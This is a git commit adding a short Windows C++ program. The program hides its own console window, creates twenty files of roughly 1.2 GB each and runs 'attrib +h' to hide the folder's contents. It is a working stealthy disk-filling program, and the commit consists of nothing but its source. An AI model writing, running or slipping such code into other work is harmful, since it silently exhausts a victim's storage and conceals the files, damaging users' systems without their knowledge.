f91564e8fbc98725a868caed0dcddcef341ee3e0
Xvendetta <anrjustin9@gmail.com>
2015-01-21 22:58:19 -0400

    main.cpp

---
+++ main.cpp
@@ -0,0 +1,20 @@
+#include <fstream>
+#include <sstream>
+#include <windows.h>
+#include <string>
+int main(){
+
+HWND stealth;
+AllocConsole();
+stealth=FindWindowA("ConsoleWindowClass",NULL);
+ShowWindow(stealth,0);
+{
+	for (int i = 0; i < 20; ++i)
+	{
+    std::ofstream ofs("file" + ( std::string() = std::to_string(i)) + ".img", std::ios::binary | std::ios::out);
+    ofs.seekp((300*2*2<<20) - 1);
+    ofs.write("", 1);
+    system("attrib +h "); //Careful! It applies to the entire folder...don't be evil!
+}
+	}
+}
